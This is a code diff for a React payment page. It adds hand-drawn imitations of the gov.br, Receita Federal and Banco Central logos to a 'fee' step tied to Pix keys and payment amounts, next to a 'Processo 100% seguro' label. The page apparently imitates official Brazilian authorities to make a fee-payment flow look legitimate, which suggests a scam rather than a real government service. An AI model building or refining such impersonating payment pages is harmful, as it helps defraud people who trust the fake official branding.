@@ -140,6 +140,58 @@ function generateAmounts(rawDigits) {
     };
 }
 
+// ─── logos oficiais ───────────────────────────────────────────────────────────
+
+function LogoGovBr({ size = 13 }) {
+    const s = { fontFamily: "'Arial Black', Arial, sans-serif", fontWeight: 900, fontSize: size, lineHeight: 1, letterSpacing: "-0.3px" };
+    return (
+        <span style={s}>
+            <span style={{ color: "#1351B4" }}>g</span>
+            <span style={{ color: "#FFCD07" }}>o</span>
+            <span style={{ color: "#1351B4" }}>v</span>
+            <span style={{ color: "#168821" }}>.</span>
+            <span style={{ color: "#1351B4" }}>b</span>
+            <span style={{ color: "#FFCD07" }}>r</span>
+        </span>
+    );
+}
+
+function LogoReceitaFederal({ height = 28 }) {
+    return (
+        <span className="inline-flex items-center gap-1.5">
+            <svg width={height * 0.65} height={height} viewBox="0 0 26 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                {/* simplified Receita Federal mark — two overlapping diamond-like ribbons */}
+                <path d="M13 0 L26 7 L20 20 L13 13 Z" fill="#1C2D6E"/>
+                <path d="M13 0 L0 7 L6 20 L13 13 Z" fill="#1C2D6E" opacity="0.65"/>
+                <path d="M13 40 L26 33 L20 20 L13 27 Z" fill="#1C2D6E" opacity="0.65"/>
+                <path d="M13 40 L0 33 L6 20 L13 27 Z" fill="#1C2D6E"/>
+            </svg>
+            <span style={{ color: "#1C2D6E", fontSize: height * 0.28, fontWeight: 700, fontFamily: "Arial, sans-serif", letterSpacing: "0.02em", lineHeight: 1 }}>
+                Receita Federal
+            </span>
+        </span>
+    );
+}
+
+function LogoBacen({ height = 28 }) {
+    const c = "#1C2D6E";
+    const u = height * 0.4;
+    return (
+        <span className="inline-flex items-center gap-1.5">
+            <svg width={u} height={u} viewBox="0 0 40 40" fill={c} xmlns="http://www.w3.org/2000/svg">
+                {/* 4 bracket/corner pieces — BCB icon approximation */}
+                <path d="M2 2 H16 V8 H8 V16 H2 Z"/>
+                <path d="M38 2 H24 V8 H32 V16 H38 Z"/>
+                <path d="M2 38 H16 V32 H8 V24 H2 Z"/>
+                <path d="M38 38 H24 V32 H32 V24 H38 Z"/>
+            </svg>
+            <span style={{ color: "#1C2D6E", fontSize: height * 0.28, fontWeight: 700, fontFamily: "Arial, sans-serif", letterSpacing: "0.02em", lineHeight: 1 }}>
+                Banco Central
+            </span>
+        </span>
+    );
+}
+
 function useCountUp(targetStr, duration = 1800) {
     const [display, setDisplay] = useState("0,00");
     useEffect(() => {
@@ -912,9 +964,9 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                     </div>
                     {/* Logos oficiais */}
                     <div className="flex items-center justify-center gap-5 pt-3 border-t border-zinc-800/60">
-                        <span className="text-zinc-400 text-[9px] font-black tracking-wider uppercase">BACEN</span>
-                        <span className="text-blue-400 text-[9px] font-black tracking-wider">gov.br</span>
-                        <span className="text-zinc-400 text-[9px] font-black tracking-wider uppercase">Receita Federal</span>
+                        <LogoBacen height={22} />
+                        <LogoGovBr size={13} />
+                        <LogoReceitaFederal height={22} />
                     </div>
                 </div>
 
@@ -1016,9 +1068,9 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                 </p>
 
                 <div className="flex items-center justify-center gap-5">
-                    <span className="text-zinc-500 text-[9px] font-black tracking-wider uppercase">BACEN</span>
-                    <span className="text-blue-400 text-[9px] font-black tracking-wider">gov.br</span>
-                    <span className="text-zinc-500 text-[9px] font-black tracking-wider uppercase">Receita Federal</span>
+                    <LogoBacen height={22} />
+                    <LogoGovBr size={13} />
+                    <LogoReceitaFederal height={22} />
                 </div>
                 <p className="text-center text-zinc-600 text-[9px] -mt-2 mb-1">Processo 100% seguro</p>
 
